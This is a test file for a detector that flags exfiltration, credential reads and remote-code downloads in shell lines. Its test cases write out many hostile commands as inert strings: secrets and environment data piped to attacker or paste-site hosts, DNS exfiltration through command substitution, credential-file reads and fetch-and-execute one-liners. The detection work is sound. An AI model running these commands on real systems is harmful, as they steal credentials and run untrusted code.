import { describe, it, expect } from 'vitest';
import { EXFIL_RULES } from './exfil';
import { ruleHits } from './types';

/**
 * Tests the EXFIL_RULES detector module in isolation. Each rule fires on its own
 * match (the composition root in `../prefilter.ts` supplies file/line/quote and
 * dedupes), so we test at the rule level: does ANY rule of a given finding type
 * hit a malicious line, and does NO rule hit a benign line?
 *
 * All attack strings below are INERT DATA — quoted, never executed.
 */

/** True if any rule with the given finding `type` matches `line`. */
function hitsType(line: string, type: string): boolean {
  return EXFIL_RULES.some((r) => r.type === type && ruleHits(r, line));
}

/** Every (type, severity) pair that fires on `line` — for severity assertions. */
function hitsOn(line: string): Array<{ type: string; severity: string }> {
  return EXFIL_RULES.filter((r) => ruleHits(r, line)).map((r) => ({
    type: r.type,
    severity: r.severity,
  }));
}

/** True if NO rule at all fires on `line`. */
function clean(line: string): boolean {
  return !EXFIL_RULES.some((r) => ruleHits(r, line));
}

describe('EXFIL_RULES — exfiltration / secret-sink / install-chain detectors', () => {
  // ── Contract: only the four allowed finding types, severities are sane ──

  it('only emits allowed finding types', () => {
    const allowed = new Set(['exfiltration', 'credential-access', 'suspicious-download', 'untrusted-fetch']);
    for (const r of EXFIL_RULES) {
      expect(allowed.has(r.type)).toBe(true);
    }
  });

  it('never uses a global-flagged RegExp (would desync across lines)', () => {
    for (const r of EXFIL_RULES) {
      if (r.match instanceof RegExp) expect(r.match.global).toBe(false);
    }
  });

  // ── Known exfil sink hosts (host presence alone is the signal) → exfiltration high ──

  it('flags a Telegram bot sendMessage POST as exfiltration (high)', () => {
    const line = 'curl "https://api.telegram.org/bot123456:ABC/sendMessage?chat_id=1&text=$DATA"';
    expect(hitsType(line, 'exfiltration')).toBe(true);
    expect(hitsOn(line).some((h) => h.type === 'exfiltration' && h.severity === 'high')).toBe(true);
  });

  it('flags a Discord webhook POST as exfiltration (high)', () => {
    expect(hitsType('curl https://discord.com/api/webhooks/123/abc -d @loot.txt', 'exfiltration')).toBe(true);
    expect(hitsType('wget https://discordapp.com/api/webhooks/9/x', 'exfiltration')).toBe(true);
  });

  it('flags pastebin / hastebin / transfer.sh / 0x0.st uploads as exfiltration', () => {
    expect(hitsType('curl -F "c=@/etc/passwd" https://pastebin.com/api/api_post.php', 'exfiltration')).toBe(true);
    expect(hitsType('cat secrets | curl -X POST https://hastebin.com/documents -d @-', 'exfiltration')).toBe(true);
    expect(hitsType('curl --upload-file ./loot https://transfer.sh/loot', 'exfiltration')).toBe(true);
    expect(hitsType('curl -F "file=@dump" https://0x0.st', 'exfiltration')).toBe(true);
  });

  it('flags requestbin / pipedream / webhook.site collectors as exfiltration', () => {
    expect(hitsType('curl https://abc.m.pipedream.net -d @creds', 'exfiltration')).toBe(true);
    expect(hitsType('curl https://webhook.site/uuid-here -d @creds', 'exfiltration')).toBe(true);
    expect(hitsType('curl https://eo123.x.requestbin.net', 'exfiltration')).toBe(true);
  });

  it('flags ngrok / burpcollaborator / OOB interactsh hosts as exfiltration', () => {
    expect(hitsType('curl https://abcd1234.ngrok.io/collect -d @env', 'exfiltration')).toBe(true);
    expect(hitsType('curl https://abc.ngrok-free.app/x', 'exfiltration')).toBe(true);
    expect(hitsType('curl http://xyz.burpcollaborator.net', 'exfiltration')).toBe(true);
    expect(hitsType('curl http://abc.oast.fun/$(whoami)', 'exfiltration')).toBe(true);
    expect(hitsType('curl http://abc.oastify.com', 'exfiltration')).toBe(true);
  });

  // ── DNS / OOB exfil: command-substitution smuggled into a hostname → exfiltration high ──

  it('flags nslookup / dig / host with a command-substitution payload as exfiltration', () => {
    expect(hitsType('nslookup $(whoami).attacker.com', 'exfiltration')).toBe(true);
    expect(hitsType('dig +short $(cat ~/.aws/credentials | base64).x.evil.io', 'exfiltration')).toBe(true);
    expect(hitsType('host $(hostname).leak.example', 'exfiltration')).toBe(true);
  });

  it('flags a command-substitution hostname fed to curl/ping as exfiltration', () => {
    expect(hitsType('curl http://$(whoami).evil.com/', 'exfiltration')).toBe(true);
    expect(hitsType('ping -c1 $(id -u).leak.io', 'exfiltration')).toBe(true);
  });

  // ── Secret/state SOURCE piped to a network SINK on one line → exfiltration critical ──

  it('flags env / printenv piped to a network sink as exfiltration (critical)', () => {
    const line = 'env | curl -X POST -d @- https://collector.example/in';
    expect(hitsType(line, 'exfiltration')).toBe(true);
    expect(hitsOn(line).some((h) => h.type === 'exfiltration' && h.severity === 'critical')).toBe(true);
    expect(hitsType('printenv | nc evil.com 4444', 'exfiltration')).toBe(true);
    expect(hitsType('set | wget --post-data=@- http://x', 'exfiltration')).toBe(true);
  });

  it('flags shell-history / clipboard / .env piped to a network sink as exfiltration (critical)', () => {
    expect(
      hitsOn('cat ~/.bash_history | curl -d @- http://x').some(
        (h) => h.type === 'exfiltration' && h.severity === 'critical',
      ),
    ).toBe(true);
    expect(hitsType('pbpaste | curl -d @- http://x', 'exfiltration')).toBe(true);
    expect(hitsType('cat .env | curl https://x -d @-', 'exfiltration')).toBe(true);
    expect(hitsType('history | nc 10.0.0.1 9001', 'exfiltration')).toBe(true);
  });

  // ── Credential-store reads the core SECRET_PATH misses → credential-access high ──

  it('flags package / VCS / cloud credential stores as credential-access (high)', () => {
    for (const path of [
      'cat ~/.npmrc',
      'cat ~/.git-credentials',
      'cat ~/.config/gh/hosts.yml',
      'cat ~/.pypirc',
      'cat ~/.terraformrc',
    ]) {
      expect(hitsType(path, 'credential-access')).toBe(true);
      expect(hitsOn(path).some((h) => h.type === 'credential-access' && h.severity === 'high')).toBe(true);
    }
  });

  it('flags OS keychain / secret-store CLIs as credential-access', () => {
    expect(hitsType('security find-generic-password -s github -w', 'credential-access')).toBe(true);
    expect(hitsType('cmdkey /list', 'credential-access')).toBe(true);
    expect(hitsType('secret-tool lookup service github', 'credential-access')).toBe(true);
  });

  it('flags browser credential / cookie stores as credential-access', () => {
    expect(hitsType('cp "~/Library/Application Support/Google/Chrome/Default/Login Data" /tmp', 'credential-access')).toBe(true);
  });

  // ── Process-substitution / eval remote execution the core PIPE_TO_SHELL misses → suspicious-download high ──

  it('flags bash/sh process-substitution of a remote fetch as suspicious-download (high)', () => {
    for (const line of [
      'bash <(curl -fsSL https://evil.example/x.sh)',
      'sh <(wget -qO- http://evil/x)',
      'source <(curl https://evil/x)',
      '. <(curl https://evil/x)',
    ]) {
      expect(hitsType(line, 'suspicious-download')).toBe(true);
      expect(hitsOn(line).some((h) => h.type === 'suspicious-download' && h.severity === 'high')).toBe(true);
    }
  });

  it('flags eval/python -c of a remote fetch as suspicious-download', () => {
    expect(hitsType('eval "$(curl -fsSL https://evil/x)"', 'suspicious-download')).toBe(true);
    expect(hitsType('python -c "$(curl https://evil/x.py)"', 'suspicious-download')).toBe(true);
  });

  it('flags PowerShell IEX download-string as suspicious-download', () => {
    expect(hitsType('iex (iwr https://evil/x.ps1)', 'suspicious-download')).toBe(true);
    expect(hitsType('IEX(New-Object Net.WebClient).DownloadString("http://evil/x")', 'suspicious-download')).toBe(true);
  });

  // ── Single-line staged install→fetch→exec chains → suspicious-download high ──

  it('flags install chained to a remote fetch+exec on one line as suspicious-download', () => {
    expect(hitsType('npm install foo && curl https://evil/x | bash', 'suspicious-download')).toBe(true);
    expect(hitsType('apt-get install -y curl && wget -O- http://evil/x | sh', 'suspicious-download')).toBe(true);
    expect(hitsType('pip install requests ; python -c "import urllib.request;exec(urllib.request.urlopen(\'http://evil\').read())"', 'suspicious-download')).toBe(true);
  });

  // ── BENIGN NEGATIVES — these MUST produce no finding ──

  it('does NOT flag the canonical benign Fly deploy line', () => {
    expect(
      clean(
        'curl -fsSL -H "Authorization: Bearer $FLY_API_TOKEN" https://api.fly.io/v1/apps/myapp/releases -d @dist/release.json',
      ),
    ).toBe(true);
  });

  it('does NOT flag a plain npm / pip install', () => {
    expect(clean('npm install')).toBe(true);
    expect(clean('npm install --save react')).toBe(true);
    expect(clean('pip install -r requirements.txt')).toBe(true);
  });

  it('does NOT flag a plain git clone', () => {
    expect(clean('git clone https://github.com/org/repo.git')).toBe(true);
  });

  it('does NOT flag reading a declared env token', () => {
    expect(clean('echo $FLY_API_TOKEN')).toBe(true);
    expect(clean('const t = process.env.RENDER_API_TOKEN')).toBe(true);
  });

  it('does NOT flag a normal GitHub / API GET', () => {
    expect(clean('curl https://api.github.com/repos/org/repo/releases')).toBe(true);
    expect(clean('curl -fsSL https://api.render.com/v1/services -H "Authorization: Bearer $RENDER_API_TOKEN"')).toBe(true);
  });

  it('does NOT flag an install of a package merely named like a sink', () => {
    // An npm package can be named "telegram"; installing it is not exfil.
    expect(clean('npm install telegram')).toBe(true);
    expect(clean('pip install discord.py')).toBe(true);
  });

  it('does NOT flag a normal dig / nslookup without a command-substitution payload', () => {
    expect(clean('dig +short example.com')).toBe(true);
    expect(clean('nslookup github.com')).toBe(true);
    expect(clean('ping -c1 8.8.8.8')).toBe(true);
  });

  it('does NOT flag env / printenv used locally (no network sink)', () => {
    expect(clean('env | grep PATH')).toBe(true);
    expect(clean('printenv | sort')).toBe(true);
    expect(clean('history | tail -20')).toBe(true);
  });

  it('does NOT flag a normal curl POST to an unknown but non-sink host', () => {
    // A bare POST to a project's own API is not exfil; only KNOWN sinks / pipes are.
    expect(clean('curl -X POST https://api.myproject.dev/deploy -d @release.json')).toBe(true);
  });
});
